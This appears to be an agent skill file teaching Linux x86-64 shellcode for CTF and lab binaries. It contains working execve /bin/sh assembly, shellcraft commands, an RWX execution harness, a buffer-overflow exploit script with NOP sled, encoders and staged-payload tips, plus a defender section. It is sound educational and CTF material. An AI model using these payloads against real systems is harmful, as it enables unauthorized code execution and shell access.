---
name: shellcode-basics
description: Use when you need to write or use position-independent machine
  code payloads on an authorized target, such as a CTF pwn challenge where NX
  is disabled, a buffer you can execute, or a ROP chain that made memory
  writable and executable. Covers shellcode anatomy, writing execve /bin/sh
  shellcode in assembly, assembling with NASM 2.16.x, generating with
  pwntools 4.13 shellcraft, keeping shellcode null-free and position
  independent, testing in a local harness, and common encoders for filtered
  input. Use when you control the instruction pointer and can redirect it to
  attacker-controlled executable bytes.
version: 1.0.0
domain: binary
lifecycle: stable
last_verified: 2026-10-23
requires: []
extends: []
relates: [pwn-fundamentals, rop-chains]
tools:
  - name: nasm
    version: 2.16.x
  - name: pwntools
    version: 4.13
  - name: Python
    version: 3.12
  - name: GDB
    version: 15.x
---

Shellcode is machine code written to run wherever it lands in memory: no
fixed addresses, no null bytes that would truncate a string copy, and no
external dependencies beyond the system call interface. You need it when
an exploit can jump to attacker-controlled bytes in executable memory,
which happens when NX is disabled or when a ROP chain calls mprotect to
make a region executable. This skill covers writing, generating, and
testing Linux x86-64 shellcode for authorized targets such as CTF
challenges and lab binaries. All work targets systems you have written
permission to test.

## Quick Workflow

1. Confirm you can execute attacker bytes: NX disabled, or a
   writable-executable region from mprotect.
2. Choose the payload goal: execve /bin/sh is standard; open/read/write
   fits filtered or seccomp-limited targets.
3. Write or generate null-free, position-independent shellcode.
4. Assemble and extract the raw bytes.
5. Test the shellcode in a local C harness before embedding it in an
   exploit.
6. Deliver it: place it in the overflow buffer or a known address, and
   overwrite the return address with its location.
7. If input filters mangle the bytes, encode the shellcode and prepend a
   decoder stub.

## 1. Anatomy of execve shellcode

The classic payload calls `execve("/bin/sh", NULL, NULL)`, which is
syscall 59 on x86-64 with rdi pointing to the string, rsi zero, rdx
zero.

```nasm
; execve("/bin/sh", NULL, NULL) - Linux x86-64, null-free
global _start
section .text
_start:
    xor rsi, rsi             ; argv = NULL
    xor rdx, rdx             ; envp = NULL
    mov rbx, 0x68732f6e69622f2f   ; "//bin/sh" as immediate
    push rbx
    mov rdi, rsp             ; rdi -> "//bin/sh"
    push 59                  ; syscall number for execve
    pop rax
    syscall
```

Why each trick matters:

- `xor rsi, rsi` instead of `mov rsi, 0`: the immediate zero would
  embed null bytes in the machine code.
- `"//bin/sh"` with a double slash: 8 bytes fill the register exactly,
  avoiding a null terminator byte in the immediate.
- `push 59; pop rax` instead of `mov rax, 59`: shorter and the
  immediate encoding stays null-free.

Assemble and extract the bytes:

```bash
nasm -f elf64 shell.asm -o shell.o
ld shell.o -o shell
# Extract raw bytes
objcopy -O binary --only-section=.text shell shellcode.bin
xxd shellcode.bin
# Sanity: no 00 bytes
xxd -p shellcode.bin | grep -q '00' && echo "HAS NULLS" || echo "null-free"
```

## 2. Generate with pwntools shellcraft

Hand-writing teaches the concepts; shellcraft is faster in practice and
its output is tested.

```bash
# Generate execve /bin/sh shellcode and show disassembly
pwn shellcraft amd64.linux.sh
# Raw bytes for embedding
pwn shellcraft amd64.linux.sh | xxd -p | tr -d '\n'; echo
```

```python
#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.os = 'linux'

# Standard shells
sc = shellcraft.sh()                 # execve /bin/sh
sc = shellcraft.execve('/bin/cat', ['/bin/cat', 'flag.txt'])  # read a file

# Inspect before using
print(disasm(asm(sc)))
print("length:", len(asm(sc)))
```

Useful shellcraft one-liners for constrained targets:

```bash
pwn shellcraft amd64.linux.cat flag.txt     # cat a file, no shell needed
pwn shellcraft amd64.linux.readfile flag.txt 1  # write file to fd 1
```

## 3. Test in a harness

Never embed untested shellcode in an exploit. Run it in a minimal
harness first.

```c
// harness.c: execute bytes from a file
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
int main(int argc, char **argv) {
    FILE *f = fopen(argv[1], "rb");
    fseek(f, 0, SEEK_END);
    long n = ftell(f); rewind(f);
    char *mem = mmap(0, n, PROT_READ|PROT_WRITE|PROT_EXEC,
                     MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    fread(mem, 1, n, f);
    ((void(*)())mem)();
    return 0;
}
```

```bash
gcc -o harness harness.c
./harness shellcode.bin
# A shell prompt (or the cat output) means the shellcode works
```

Debug failures in GDB by breaking at the mapped region and
single-stepping the syscalls:

```bash
gdb -q ./harness
# (gdb) run shellcode.bin
# (gdb) break *$rax  # after mmap returns, break at shellcode start
# (gdb) stepi
# Watch rdi/rsi/rdx/rax before each syscall instruction
```

## 4. Deliver it in an exploit

The standard layout: overflow the buffer, place shellcode after the
saved return address (or before it in a large buffer), and overwrite
the return address with the shellcode's address.

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF('./vuln')
context.arch = 'amd64'
OFFSET = 72

# NOP sled absorbs small address errors
NOP = asm('nop')
shellcode = asm(shellcraft.sh())

p = process('./vuln')
# Layout: [shellcode][NOP sled][padding][return address -> shellcode]
buf_addr = 0x7fffffffe000  # example: find the real address via leak or core
payload = shellcode
payload += NOP * (OFFSET - len(shellcode))
payload += p64(buf_addr)
p.sendline(payload)
p.interactive()
```

Finding the buffer address: if ASLR randomizes the stack, you need a
leak (a stack address printed by the binary, or a core dump from a
crash). Without a leak, a NOP sled plus brute force only works when
the address range is narrow, which modern ASLR defeats.

The ROP-to-shellcode path (NX enabled): use a ROP chain to call
`mprotect` on a writable region, copy shellcode there, and jump to it.
See rop-chains for the chain mechanics; the mprotect call is
`mprotect(addr, len, PROT_READ|PROT_WRITE|PROT_EXEC)`.

## 5. Null-free and position-independent discipline

Every byte of shellcode must survive the delivery path:

```bash
# Check for nulls, newlines, and spaces if the input path filters them
xxd -p shellcode.bin | tr -d '\n' | grep -E '00|0a|20' && echo "BAD BYTES PRESENT"
```

Techniques to stay clean:

- Zero registers with `xor reg, reg`, never `mov reg, 0`.
- Build strings on the stack with pushes, not with absolute addresses.
- Reference data with RIP-relative `lea`, never hardcoded addresses.
- Avoid `0x0a` (newline) when input comes through `fgets` or line
  based protocols; restructure the assembly to dodge the byte.

## 6. Encoders for filtered input

When the input path transforms bytes (XOR filter, alphanumeric-only),
encode the shellcode and prepend a small decoder that restores it at
runtime.

```bash
# pwntools encoders: list and apply
pwn shellcraft --list | grep -i encoder
python3 -c "
from pwn import *
context.arch = 'amd64'
sc = asm(shellcraft.sh())
enc = encode(sc, b'\x00')  # avoid null bytes in output
print('encoded length:', len(enc))
"
```

The encoded payload layout is `[decoder stub][encoded shellcode]`.
The stub runs first, decodes the body in place, and jumps to it. Test
the full encoded blob in the harness, not just the raw shellcode,
because the stub itself must also be filter-clean.

## Edge cases

- NX is enabled and you assumed it was not. Check with checksec
  before writing shellcode; an NX target needs ROP, not shellcode.
- The shellcode works in the harness but crashes in the exploit. The
  usual cause is a wrong buffer address or stack misalignment. Verify
  the landing address in GDB with a breakpoint on the overwritten
  return.
- `execve` is blocked by seccomp. The shell spawns and dies
  instantly. Switch to an open/read/write chain that reads the flag
  directly (shellcraft `readfile`).
- The input path uppercases or lowercases bytes. Standard shellcode
  will not survive. Use an alphanumeric encoder or find a different
  input path.
- 32-bit target. The syscall numbers and calling convention differ
  (`int 0x80`, syscall 11 for execve). Set `context.arch = 'i386'`
  and use the i386 shellcraft templates.

## Escalation

- You cannot find an executable writable region: ROP a call to
  `mmap` with RWX permissions to create one, then copy shellcode in
  with a second stage read.
- The buffer is too small for a full execve payload: use a staged
  approach, a tiny `read` stub that loads a larger second stage, or
  an egg hunter if the memory layout is unpredictable.
- Shellcode must fit extreme size limits (under 30 bytes): hand-write
  minimal payloads and drop the NOP sled; every byte counts, so
  assemble and measure rather than guessing.
- Nothing executes and protections look fine: recheck for seccomp,
  AppArmor, or container restrictions on the target that kill
  syscalls regardless of memory permissions.

## Detection and defender view

Defenders detect shellcode through NX enforcement (the primary
defense: injected code simply faults), intrusion detection on
non-printable network input, and behavioral monitoring for unexpected
process ancestry (a network daemon spawning a shell). Durable
mitigations are NX on all data pages, ASLR so landing addresses are
unguessable, seccomp profiles that deny execve to services that never
need it, and input validation at the trust boundary. For developers,
the fix is eliminating the memory corruption that lets attacker bytes
reach the instruction pointer in the first place.

## Key references

- CWE-121 (Stack-based Buffer Overflow): the usual delivery bug.
- CWE-787 (Out-of-bounds Write).
- CWE-94 (Improper Control of Generation of Code, Code Injection).
- MITRE ATT&CK T1068 (Exploitation for Privilege Escalation).
- Linux syscall table (x86-64): https://filippo.io/linux-syscall-table/
- NASM documentation: https://www.nasm.us/doc/
- pwntools shellcraft docs: https://docs.pwntools.com/en/stable/shellcraft/
